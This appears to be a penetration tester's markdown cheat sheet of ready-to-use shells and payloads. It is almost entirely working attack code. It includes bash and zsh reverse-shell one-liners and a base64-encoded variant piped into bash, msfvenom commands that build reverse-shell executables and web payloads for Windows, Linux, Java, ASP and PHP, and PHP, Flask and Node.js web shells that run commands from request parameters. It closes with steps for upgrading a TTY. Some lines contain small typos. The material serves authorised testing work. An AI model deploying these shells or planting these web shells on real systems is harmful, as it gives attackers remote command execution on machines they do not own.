# Shell & Payloads

## Introduction

## Table of Contents

- [Shell \& Payloads](#shell--payloads)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [Payload Structure - msfvenom](#payload-structure---msfvenom)
  - [Non-Meterpreter shells](#non-meterpreter-shells)
    - [Useful reverse shells](#useful-reverse-shells)
    - [Windows](#windows)
      - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter)
      - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter)
      - [x86 stageless - msfvenom (Non-Meterpreter)](#x86-stageless---msfvenom-non-meterpreter)
      - [x64 stageless - msfvenom (Non-Meterpreter)](#x64-stageless---msfvenom-non-meterpreter)
    - [Linux](#linux)
      - [x86 staged - msfvenom (Non-Meterpreter)](#x86-staged---msfvenom-non-meterpreter-1)
      - [x64 staged - msfvenom (Non-Meterpreter)](#x64-staged---msfvenom-non-meterpreter-1)
      - [x86 stageless - msfvenom (Non-Meterpreter)](#x86-stageless---msfvenom-non-meterpreter-1)
      - [x64 stageless - msfvenom (Non-Meterpreter)](#x64-stageless---msfvenom-non-meterpreter-1)
  - [Web Payloads](#web-payloads)
    - [Java WAR - msfvenom (Non-Meterpreter)](#java-war---msfvenom-non-meterpreter)
    - [ASP - msfvenom (Non-Meterpreter)](#asp---msfvenom-non-meterpreter)
    - [ASPX - msfvenom (Non-Meterpreter)](#aspx---msfvenom-non-meterpreter)
    - [JSP - msfvenom (Non-Meterpreter)](#jsp---msfvenom-non-meterpreter)
    - [WAR - msfvenom (Non-Meterpreter)](#war---msfvenom-non-meterpreter)
    - [PHP - msfvenom (Non-Meterpreter) - Reverse Shell](#php---msfvenom-non-meterpreter---reverse-shell)
  - [Web Shells](#web-shells)
    - [PHP](#php)
    - [JSP](#jsp)
    - [ASP](#asp)
    - [ASPX](#aspx)
    - [Webshell Infecting views.py - Python (Flask)](#webshell-infecting-viewspy---python-flask)
    - [nodejs](#nodejs)
    - [Perl](#perl)
  - [Spawn tty via Python](#spawn-tty-via-python)
  - [Spawn an upgraded shell](#spawn-an-upgraded-shell)

## Payload Structure - msfvenom

A staged payload is usually shipped in two parts. The first part contains a small primary payload that will establish a connection, transferring a larger secondary payload with the rest of the shellcode.  
windows/shell_reverse_tcp (stageless)
windows/shell/reverse_tcp (staged)

## Non-Meterpreter shells

### Useful reverse shells

- Reverse shell oneliners:

```sh
bash -i >& /dev/tcp/<ip>/443 0>&1 # bash
bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1" # sh or dash
zsh -c 'zmodload zsh/net/tcp && ztcp <ip> 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' # zsh
```

- Reverse shell encoded oneliner:

```sh
echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" | base64
echo '<payload>' | base64 --decode | bash
```

- TCP reverse shell executable:

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
```

### Windows

#### x86 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x86.exe
```

#### x64 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x64.exe
```

#### x86 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > <name>-x86.exe
```

#### x64 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > ,name>-x64.exe
```

### Linux

#### x86 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### x64 staged - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### x86 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

#### x64 stageless - msfvenom (Non-Meterpreter)

```sh
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## Web Payloads

### Java WAR - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

### ASP - msfvenom (Non-Meterpreter)

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

### ASPX - msfvenom (Non-Meterpreter)

```sh
msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<LPORT> -f aspx > shell.aspx
```

### JSP - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### WAR - msfvenom (Non-Meterpreter)

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

### PHP - msfvenom (Non-Meterpreter) - Reverse Shell

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```
or  
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php  
https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php

## Web Shells

### PHP 

```php
<?php echo shell_exec($_GET['cmd']);?>
<?php system($_GET['cmd']);?>
<?php echo exec($_GET['cmd']);?>
```

### JSP

https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmdjsp.jsp  
OR
```sh

locate cmdjsp.jsp
```
### ASP

https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd-asp-5.1.asp  
https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.asp  

OR
```sh
locate cmd-asp-5.1.asp
locate cmdasp.asp
```

### ASPX

https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx  

OR
```
locate cmdasp.aspx
```

### Webshell Infecting views.py - Python (Flask)

```python
import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/okay')
def cmd():
    return os.system(request.args.get('c'))

if __name__ == "__main__":
	app.run()
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py

### nodejs

``` node
const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js

### Perl

Find and edit
```
locate perl-reverse-shell.pl
```

## Spawn tty via Python

``` python
python -c 'import pty;pty.spawn("/bin/bash")';
```

## Spawn an upgraded shell

```
export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null 
```
`ctrl + z`
```
stty raw -echo; fg 
```
